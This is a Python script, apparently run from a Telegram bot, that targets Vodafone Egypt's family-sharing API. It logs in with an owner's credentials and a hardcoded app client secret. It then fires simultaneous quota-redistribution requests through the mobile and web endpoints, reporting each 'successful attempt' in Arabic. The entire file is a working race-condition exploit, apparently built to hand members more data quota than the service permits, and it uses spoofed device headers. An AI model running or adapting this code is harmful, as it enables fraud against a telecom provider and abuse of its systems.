import requests
import time
from threading import Thread
from functools import partial
from concurrent.futures import ThreadPoolExecutor

session = requests.Session()
FIXED_QUOTA = 40

def get_access_token(number, password):
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    headers = {
        "x-dynatrace": "MT_3_8_2164993384_64-0_a556db1b-4506-43f3-854a-1d2527767923_0_1080_235",
        "x-agent-operatingsystem": "1601266300",
        "clientId": "AnaVodafoneAndroid",
        "x-agent-device": "Sherif_Omar",
        "x-agent-version": "2021.12.2",
        "x-agent-build": "493",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.9.1"
    }
    data = {
        "username": number,
        "password": password,
        "grant_type": "password",
        "client_secret": "a2ec6fff-0b7f-4aa4-a733-96ceae5c84c3",
        "client_id": "my-vodafone-app"
    }
    try:
        response = requests.post(url, headers=headers, data=data)
        return response.json().get("access_token")
    except:
        return None

def thread1(quota, member1, access_token, number, context, user_id):
    url = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
    headers = {
        "api-host": "ProductOrderingManagement",
        "useCase": "MIProfile",
        "Authorization": f"Bearer {access_token}",
        "api-version": "v2",
        "x-agent-operatingsystem": "9",
        "clientId": "AnaVodafoneAndroid",
        "x-agent-device": "Xiaomi Redmi 6A",
        "x-agent-version": "2024.3.2",
        "x-agent-build": "592",
        "msisdn": number,
        "Accept": "application/json",
        "Accept-Language": "ar",
        "Content-Type": "application/json; charset=UTF-8",
        "Host": "mobile.vodafone.com.eg",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.11.0"
    }
    data = {
        "category": [{"listHierarchyId": "TemplateID", "value": "47"}],
        "createdBy": {"value": "MobileApp"},
        "parts": {
            "characteristicsValue": {
                "characteristicsValue": [{"characteristicName": "quotaDist1", "type": "percentage", "value": quota}]
            },
            "member": [
                {"id": [{"schemeName": "MSISDN", "value": number}], "type": "Owner"},
                {"id": [{"schemeName": "MSISDN", "value": member1}], "type": "Member"}
            ]
        },
        "type": "QuotaRedistribution"
    }
    try:
        response = session.post(url, headers=headers, json=data)
        return str(response.json()) == "{}"
    except:
        return False

def thread2(quota, member2, access_token, number, context, user_id):
    url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
    headers = {
        "Host": "web.vodafone.com.eg",
        "Connection": "keep-alive",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        "msisdn": number,
        "Accept-Language": "AR",
        "sec-ch-ua-mobile": "?1",
        "Authorization": f"Bearer {access_token}",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "x-dtpc": "5$338036891_621h9vEAOVPAOTUAJDPRUQFKUMHFVECNFHNCFC-0e0",
        "Accept": "application/json",
        "clientId": "WebsiteConsumer",
        "sec-ch-ua-platform": '"Android"',
        "Origin": "https://web.vodafone.com.eg",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://web.vodafone.com.eg/spa/familySharing/manageFamily",
        "Accept-Encoding": "gzip, deflate, br, zstd"
    }
    payload = {
        "category": [{"listHierarchyId": "TemplateID", "value": "47"}],
        "createdBy": {"value": "MobileApp"},
        "parts": {
            "characteristicsValue": {
                "characteristicsValue": [{"characteristicName": "quotaDist1", "type": "percentage", "value": quota}]
            },
            "member": [
                {"id": [{"schemeName": "MSISDN", "value": number}], "type": "Owner"},
                {"id": [{"schemeName": "MSISDN", "value": member2}], "type": "Member"}
            ]
        },
        "type": "QuotaRedistribution"
    }
    try:
        response = session.post(url, headers=headers, json=payload)
        return str(response.json()) == "{}"
    except:
        return False

def execute_attempt(user_id, attempt_num, total_attempts, context, user_data):
    access_token = get_access_token(user_data['number'], user_data['password_owner'])
    
    if not access_token:
        return False
    
    with ThreadPoolExecutor() as executor:
        prep_futures = []
        prep_futures.append(executor.submit(partial(thread1, quota=10, member1=user_data['member1'], 
                                     access_token=access_token, number=user_data['number'], 
                                     context=context, user_id=user_id)))
        prep_futures.append(executor.submit(partial(thread2, quota=10, member2=user_data['member2'], 
                                     access_token=access_token, number=user_data['number'], 
                                     context=context, user_id=user_id)))
        
        prep_results = [f.result() for f in prep_futures]
        
        if all(prep_results):
            main_futures = []
            main_futures.append(executor.submit(partial(thread1, quota=FIXED_QUOTA, member1=user_data['member1'], 
                                                 access_token=access_token, number=user_data['number'], 
                                                 context=context, user_id=user_id)))
            main_futures.append(executor.submit(partial(thread2, quota=FIXED_QUOTA, member2=user_data['member2'], 
                                                 access_token=access_token, number=user_data['number'], 
                                                 context=context, user_id=user_id)))
            
            main_results = [f.result() for f in main_futures]
            if all(main_results):
                context.bot.send_message(chat_id=user_id, 
                                      text=f"✅ نجاح المحاولة {attempt_num}/{total_attempts}")
                return True
    
    return False